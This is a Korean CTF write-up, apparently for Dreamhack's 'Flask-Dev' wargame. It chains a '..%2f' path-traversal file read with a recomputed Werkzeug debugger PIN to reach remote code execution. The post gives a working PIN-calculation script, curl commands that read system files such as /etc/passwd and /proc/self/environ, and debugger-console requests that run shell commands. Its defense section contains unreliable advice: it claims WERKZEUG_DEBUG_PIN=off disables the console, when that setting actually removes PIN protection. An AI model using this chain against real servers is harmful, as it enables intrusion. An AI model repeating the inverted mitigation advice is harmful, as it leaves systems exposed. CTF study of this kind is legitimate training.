---
layout: post
title:  "Dreamhack 워게임 Flask-Dev 풀이 — Werkzeug 디버그 PIN을 LFI로 직접 계산해서 RCE 따내기"
date:   2026-05-15 03:30:00 +0900
categories: security web wargame dreamhack writeup flask werkzeug rce
---

## 들어가며

이번 글은 Dreamhack 웹해킹 워게임 **Flask-Dev** (난이도 Gold 4, "숙련된 웹해커를 위한 문제") 풀이입니다. 13줄짜리 Flask 앱 하나가 전부지만, **Werkzeug 디버그 콘솔 PIN을 직접 재계산해서 자물쇠를 따고 들어가는** 클래식한 트릭이 핵심입니다.

문제 코드는 이게 전부입니다.

```python
#!/usr/bin/python3
from flask import Flask
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

@app.route('/')
def index():
    return 'Hello !'

@app.route('/<path:file>')
def file(file):
    return open(file).read()

app.run(host='0.0.0.0', port=8000, threaded=True, debug=True)
```

13줄에 두 가지 끔찍한 죄목이 동시에 들어있습니다.

1. `@app.route('/<path:file>')` + `return open(file).read()` — **임의 파일 읽기(LFI)**
2. `debug=True` — Werkzeug 디버거 콘솔이 `/?__debugger__=yes&cmd=...` 로 노출됨. 콘솔만 풀면 **임의 Python 코드 실행(RCE)**

이 두 가지는 **궁합이 끝내주게 좋습니다**. LFI 로 PIN 산정에 필요한 파일들을 다 빼와서 PIN을 손으로 계산하면 그대로 콘솔이 열립니다.

스포일러로 결론:

```
PIN = MD5( username + modname + appname + moddir + uuid.getnode() + machine_id + "cookiesalt" + "pinsalt" )
    → 첫 9자리 정수 → "XXX-XXX-XXX" 포맷
```

최종 flag: `DH{2517d2b288f2cdee289a14d3bacd1afc}` (실행파일 `/flag`의 stdout).

## 1. 첫인상 — LFI는 보이는데 flag는 실행파일

Dockerfile 을 보면 flag 가 실행파일로 컴파일되고 권한이 `chmod 111` 입니다.

```dockerfile
RUN gcc /app/flag.c -o /flag \
    && chmod 111 /flag && rm /app/flag.c
USER $user   # dreamhack
```

`111` = 실행만 가능(`--x--x--x`), 읽기 금지. 즉 **LFI 로는 `/flag` 의 내용을 못 읽고, 실행(`/flag` exec)만이 답**입니다. → 결국 RCE 가 필요. → Werkzeug 디버거 콘솔이 그 통로.

## 2. Werkzeug 디버거 PIN의 동작 원리

Werkzeug 0.11 부터, 디버거 콘솔에 접근하려면 서버 콘솔에 출력된 **9자리 PIN** 을 입력해야 합니다. 이 PIN 은 `werkzeug/debug/__init__.py` 의 `get_pin_and_cookie_name()` 함수에서 계산됩니다.

Werkzeug 1.0.1 기준 함수의 핵심은 다음과 같습니다.

```python
probably_public_bits = [
    username,                                # getpass.getuser()
    modname,                                 # app.__module__  ← 보통 "flask.app"
    getattr(app, "__name__", type(app).__name__),  # "Flask"
    getattr(mod, "__file__", None),          # flask/app.py 의 실제 경로
]
private_bits = [str(uuid.getnode()), get_machine_id()]

h = hashlib.md5()       # ← 주의: 1.0.x 는 MD5, 그보다 옛/새 버전은 SHA1
for bit in chain(probably_public_bits, private_bits):
    if not bit: continue
    if isinstance(bit, str): bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]

h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]
# 그룹화: "XXX-XXX-XXX"
```

여기서 PIN을 재현하려면 **이 6개 입력값을 알아내야** 합니다.

- `username` — 서버 프로세스의 사용자명
- `modname` — `app.__module__`. Flask 인스턴스라면 보통 `'flask.app'`
- `appname` — `Flask`
- `moddir` — Flask 가 설치된 `app.py` 의 실제 경로
- `uuid.getnode()` — eth0 MAC 어드레스의 48-bit 정수
- `get_machine_id()` — `/etc/machine-id` (혹은 `boot_id`) + `/proc/self/cgroup` 첫 줄의 마지막 `/` 이후 부분을 이어붙인 바이트열

이 6개를 모두 **LFI 로 빼낼 수 있다**는 것이 함정의 본질입니다.

## 3. LFI 가 동작하는 방식 — `<path:file>` 의 함정

```python
@app.route('/<path:file>')
def file(file):
    return open(file).read()
```

라우팅 시 `<path:file>` 는 URL의 path 부분 전체를 캡쳐하지만 **선행 `/`는 제거**합니다. 그래서 `GET /etc/passwd` 를 보내도 `file` 변수에는 `'etc/passwd'` 가 들어옵니다. `open('etc/passwd')` 는 cwd 기준 상대경로 — cwd 는 `/app` (Dockerfile `WORKDIR /app`) — 그래서 `FileNotFoundError` 가 발생합니다.

```
"No such file or directory: 'etc/passwd'"
```

여기서 핵심 트릭: **`..` 를 URL 인코딩**해서 슬래시-필터를 우회.

```
GET /..%2fetc/passwd
```

라우팅 시 캡쳐된 file 변수에는 디코딩된 `'../etc/passwd'` 가 들어가고, `open('../etc/passwd')` 는 `/app/../etc/passwd` = `/etc/passwd` 로 resolve. 성공.

```bash
$ curl -s "$SERVER/..%2fetc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
dreamhack:x:1000:1000:,,,:/home/dreamhack:/bin/bash
```

이 한 줄의 LFI 가 PIN 계산용 정보 수집의 만능 키가 됩니다.

## 4. PIN 입력값 6개 수집

```bash
SERVER=http://host8.dreamhack.games:22889
LFI() { curl -s "$SERVER/..%2f$1" --max-time 5; }
```

### 4-1. username

`getpass.getuser()` 는 ENV(`LOGNAME`/`USER`/`LNAME`/`USERNAME`) 를 먼저 찾고, 없으면 `pwd.getpwuid(os.getuid())[0]` 로 떨어집니다.

```bash
LFI proc/self/environ | tr '\0' '\n' | grep -iE '^(logname|user|lname|username)='
# (출력 없음 — 환경변수에 USER/LOGNAME 등이 설정되지 않음)

LFI proc/self/status | head -10
# Uid:	1000	1000	1000	1000

LFI etc/passwd | grep 1000
# dreamhack:x:1000:1000:,,,:/home/dreamhack:/bin/bash
```

→ **username = `dreamhack`**

`/proc/self/environ` 에 `user=dreamhack` (소문자) 는 있지만 Python 은 대문자 `USER` 만 찾기 때문에 무시되고 pwd 폴백을 탑니다.

### 4-2. modname, appname, moddir

이건 Flask 의 표준값.

- `modname = 'flask.app'` (Flask 클래스가 `flask/app.py` 모듈에 정의되어 있어 `app.__module__` 가 `'flask.app'`)
- `appname = 'Flask'`
- `moddir = '/usr/local/lib/python3.8/site-packages/flask/app.py'` ← 디버그 페이지의 traceback 에 이미 노출됨!

이미 첫 에러 페이지에서 `<cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>` 가 보여서 추측 없이 확정됩니다.

### 4-3. `uuid.getnode()` — eth0 MAC

```bash
LFI sys/class/net/eth0/address
# aa:fc:00:00:c8:01
```

→ `0xaafc0000c801` = **187999308531713**

```bash
$ python3 -c "print(int('aafc0000c801', 16))"
187999308531713
```

이 컨테이너는 libuuid 가 정상 동작해서 `uuid.getnode()` 가 위 MAC 을 그대로 반환합니다.

### 4-4. `get_machine_id()`

Werkzeug 1.0.1 의 `get_machine_id()` 알고리즘:

```python
linux = b""
# (1) /etc/machine-id 또는 /proc/sys/kernel/random/boot_id 중 먼저 읽히는 쪽
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
    try:
        with open(filename, "rb") as f:
            value = f.readline().strip()
    except IOError: continue
    if value:
        linux += value
        break

# (2) /proc/self/cgroup 첫 줄의 마지막 '/' 이후 부분을 이어붙임
try:
    with open("/proc/self/cgroup", "rb") as f:
        linux += f.readline().strip().rpartition(b"/")[2]
except IOError: pass

return linux
```

각 파일을 직접 읽어 합치면:

```bash
LFI etc/machine-id
# c31eea55a29431535ff01de94bdcf5cf

LFI proc/self/cgroup | head -1
# 13:pids:/libpod_parent/libpod-30cdc10ce6726db6f79c2a7a272d9d3f2b7404de53982aa103753e8f49bdd584
```

`rpartition('/')` 는 마지막 `/` 기준으로 3-tuple 을 만들고 `[2]` 가 마지막 토큰:

```
libpod-30cdc10ce6726db6f79c2a7a272d9d3f2b7404de53982aa103753e8f49bdd584
```

이어붙이면:

```
machine_id = b"c31eea55a29431535ff01de94bdcf5cf"
           + b"libpod-30cdc10ce6726db6f79c2a7a272d9d3f2b7404de53982aa103753e8f49bdd584"
```

### 4-5. PIN 계산

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'dreamhack',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.8/site-packages/flask/app.py',
]
mac_int = int('aafc0000c801', 16)
machine_id = (b'c31eea55a29431535ff01de94bdcf5cf'
              + b'libpod-30cdc10ce6726db6f79c2a7a272d9d3f2b7404de53982aa103753e8f49bdd584')
private_bits = [str(mac_int), machine_id]

h = hashlib.md5()        # ★ 1.0.x 는 MD5
for bit in chain(probably_public_bits, private_bits):
    if not bit: continue
    if isinstance(bit, str): bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]
pin = '-'.join(num[i:i+3] for i in range(0, 9, 3))

print(pin)   # → 770-459-691
```

## 5. PIN 입력 + 콘솔에서 `/flag` 실행

Werkzeug 디버거는 모든 요청에 `?__debugger__=yes&cmd=...&s=<secret>` 형태로 명령을 받습니다. `secret` 은 디버그 페이지 HTML 안에 `SECRET = "..."` 형태로 노출되어 있습니다.

```html
<script type="text/javascript">
  var TRACEBACK = ...,
      CONSOLE_MODE = false,
      EVALEX = true,
      EVALEX_TRUSTED = false,
      SECRET = "sEA0wsC3kjxJMo3QyUFV";
</script>
```

이 secret 은 self.secret 으로 디버거 init 시 한 번 생성된 뒤 서버 재시작 전까지 동일합니다.

```bash
PIN=770-459-691
SECRET=sEA0wsC3kjxJMo3QyUFV
COOKIE=/tmp/wz.txt

# (1) PIN 인증
curl -s -c "$COOKIE" \
  "$SERVER/nonexistent?__debugger__=yes&cmd=pinauth&pin=$PIN&s=$SECRET"
# → {"auth": true, "exhausted": false}
```

이후 콘솔(frame 0) 에 Python 코드를 보내면 그 자리에서 실행됩니다.

```bash
# (2) /flag 실행
curl -s -G "$SERVER/" \
  --data-urlencode 'cmd=__import__("os").popen("/flag").read()' \
  --data-urlencode "s=$SECRET" \
  --data-urlencode 'frm=0' \
  --data-urlencode '__debugger__=yes' \
  -b "$COOKIE"
```

응답:

```html
&gt;&gt;&gt; __import__("os").popen("/flag").read()
<span class="string">'DH{2517d2b288f2cdee289a14d3bacd1afc}\n\n'</span>
```

flag 획득. ✓

## 6. 취약점 해설

### 6-1. 왜 디버그 모드가 production 에 노출되면 곧 RCE 인가

`debug=True` 하나로 Werkzeug 가 enable 하는 것:

1. 예외 발생 시 디버거 UI 노출 — 코드/traceback 노출
2. `?__debugger__=yes` 로 시작하는 임의의 frame eval 진입점
3. eval 진입점은 PIN 으로만 게이트되어 있는데, **PIN 산정 입력값들이 거의 전부 시스템에서 읽을 수 있는 정보** — LFI/SSRF/log leak 한 가지만 동반되면 PIN 재계산 가능
4. PIN 통과 시 Python 인터프리터 그대로 노출 → 임의 코드 실행

즉 "디버그 모드 + 어떠한 정보 누설" = RCE. 이 둘이 만나는 모든 production 인스턴스는 즉시 침투 가능합니다.

### 6-2. 위험성

이 패턴은 실제 사고로 자주 나옵니다.

- 2018 Tesla AWS — Flask debugger 가 노출된 K8s 대시보드를 통해 침투
- 2020 cryptocurrency 마이닝 봇넷 — Flask `debug=True` 인스턴스 자동 사냥
- 다수의 Django dev server, Werkzeug debugger, Spring Boot `actuator/heapdump` 등이 같은 부류

### 6-3. 방어

1. **production 에서 `debug=True` 금지.** 환경변수 `FLASK_ENV=production` 가 강제로 디버그를 끄도록.
2. 컨테이너 기본 entrypoint 가 `flask run --debug` 가 되어 있다면 운영 빌드에서 분리.
3. **LFI 1차 차단**: 사용자 입력을 그대로 `open()` 에 넘기지 말 것. 화이트리스트/정규화 필수.

   ```python
   ALLOWED = {'a.png', 'b.png'}
   @app.route('/<file>')
   def serve(file):
       if file not in ALLOWED: abort(404)
       return send_from_directory(STATIC_DIR, file)
   ```

4. **WERKZEUG_DEBUG_PIN=off** 를 강제하면 디버그를 켜더라도 콘솔이 비활성화됩니다. 임시 디버깅 환경에서는 이 옵션을 적극 활용.
5. **CSP + 같은 도메인 격리.** 디버거 콘솔 자체가 사용자 트래픽과 같은 origin 에 있으면 안 됩니다.

## 7. 정리 — 입문자가 가져갈 교훈

- `debug=True` 는 단순한 편의 기능이 아니라 **PIN 만 통과하면 임의 코드 실행** 이 가능한 백도어다.
- PIN 산정에 들어가는 6개 입력값은 **거의 전부 정상 LFI/SSRF/log/디버그 페이지 자체** 로 빼낼 수 있다. 디버그 모드와 정보 누설이 만나는 순간 끝.
- Werkzeug 1.0.x 는 **MD5**, 그보다 옛/새 버전은 **SHA1**. 해시 알고리즘만 잘못 골라도 PIN 이 안 맞으니 항상 `werkzeug/__init__.py` 의 `__version__` 을 확인하고, `werkzeug/debug/__init__.py` 의 `h = hashlib.???()` 라인을 직접 보자.
- `<path:>` 컨버터는 URL 의 선행 `/` 를 떨궈낸다는 점에 유의. `..%2f` 같은 URL 인코딩 우회로 상대경로를 강제로 만들 수 있다.

같은 카테고리의 다음 단계로는 **Flask SSTI**, **Werkzeug 0.x PIN (SHA1)**, **`gunicorn` + Flask 디버그 분리** 등을 풀어 보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 해시 알고리즘을 SHA1 로 가정하고 시작

처음에 Werkzeug PIN 산정 알고리즘이 **SHA1** 인 줄 알고 한 번 계산했는데, `{"auth": false, "exhausted": false}` 가 떨어졌습니다. 원인은 단순했습니다 — **Werkzeug 1.0.x 는 MD5**. 1.0.0 직전과 직후의 버전이 알고리즘이 다릅니다.

```bash
# 확인 방법
curl -s "$SERVER/..%2fusr/local/lib/python3.8/site-packages/werkzeug/__init__.py" \
  | grep '__version__'
# → __version__ = "1.0.1"

curl -s "$SERVER/..%2fusr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py" \
  | grep 'h = hashlib'
# → h = hashlib.md5()
```

**회고**: PIN 계산은 알고리즘을 **로컬에서 메모리에 있는 PIN 알고리즘** 으로 짜지 말고, **타겟 서버의 Werkzeug 소스를 직접 읽고 그 코드를 재현**해야 한다. 한 줄(`h = hashlib.???`)만 다르면 9자리 숫자가 완전히 달라지므로 항상 첫 번째로 확인할 것.

### 실패 2. machine_id 변형을 너무 빨리 의심

PIN 이 안 맞자 처음에는 `get_machine_id()` 가 cgroup 을 안 붙이는 옛 버전이 아닐까, boot_id 만 쓰는 게 아닐까 하고 여러 변형을 다 시도했습니다. 실제 원인(MD5 vs SHA1) 을 깨닫는 데 그만큼 시간이 더 들었습니다.

**회고**: 잘못 짚었을 때는 변수를 **하나씩** 바꾸지 말고, **계산의 출발점**(해시 알고리즘, 입력 리스트 순서, encoding) 부터 점검해야 한다. 작은 잎(machine_id 의 변형 가능성) 보다 큰 줄기(해시 함수) 를 의심하는 게 비용 대비 효과가 압도적이다.

### 실패 3. `uuid.getnode()` 가 random fallback 일 수 있다는 걱정

`uuid.getnode()` 는 libuuid/ip/ifconfig 등이 모두 실패하면 **랜덤 48-bit 정수** 를 캐시해서 반환합니다. 이 경우 PIN 은 재현 불가능. 처음에는 컨테이너에 `ifconfig`/`ip` 가 없어 보이길래 "PIN을 재현할 수 없는 게 아닐까?" 라고 걱정했습니다.

다행히 이 컨테이너에는 `libuuid.so.1` 이 설치되어 있어 `_unix_getnode()` 가 정상 작동, 실제 MAC(`aa:fc:00:00:c8:01`) 을 반환합니다. 확인 방법:

```bash
LFI lib/x86_64-linux-gnu/libuuid.so.1   # → 200 이면 존재
```

**회고**: PIN 계산 전에 **타겟 환경의 `uuid` 모듈이 어떤 게터를 사용할지** 먼저 추정해야 한다. `_uuid` extension 가 있으면 libuuid, 없으면 shell-out 순서. 컨테이너 환경이라 `ifconfig`/`ip` 가 흔히 빠지므로, `libuuid` 존재 여부가 PIN 재현 가능성의 1차 기준이다.

### 실패 4. LFI 의 leading-slash 트릭을 처음에 안 떠올림

`/<path:file>` 라우트로 `GET /etc/passwd` 를 보냈을 때 `'etc/passwd'` 만 캡쳐되는 걸 보고 잠깐 멈췄습니다. **Flask 의 `<path:>` 컨버터가 선행 `/`를 떨궈낸다** 는 점을 까먹고 `//etc/passwd` 같은 더블 슬래시를 시도해서 시간을 좀 썼습니다. 결국 `..%2fetc/passwd` (URL-encoded `..`) 가 가장 깔끔한 우회였습니다.

**회고**: `<path:>` 컨버터 + `open()` 패턴은 다음 우회 셋만 외워두면 거의 모든 케이스 커버.

- `..%2f...` — URL 인코딩된 상위 디렉터리
- 절대 경로가 필요할 때: cwd 위치를 디버그 페이지의 traceback frames 에서 확인 (`File "/app/app.py"` 처럼)
- 컨테이너 cwd 가 `/` 가 아니면 항상 `../` 한 번이 필요

### 실패 5. 디버거 콘솔에 frame ID 를 헷갈림

PIN auth 성공 후 콘솔에 코드를 날릴 때, 일반 traceback frame ID (예: `frame-140516928424544`) 를 그대로 `frm=` 에 넣어야 하는 줄 알았습니다. 실제로는 **standalone 콘솔용 frame 0** 이 따로 있고, `cmd=` 명령을 `frm=0` 로 보내면 됩니다 (디버거가 자동으로 `_ConsoleFrame` 를 생성해 줍니다).

**회고**: Werkzeug 디버거에는 두 가지 콘솔이 있다. (1) traceback frame 내 콘솔: 그 프레임의 로컬 변수에 접근. (2) standalone 콘솔: 빈 namespace, `app` 변수가 미리 들어있음. RCE 만 노린다면 (2) 가 압도적으로 편하다 (`frm=0`).
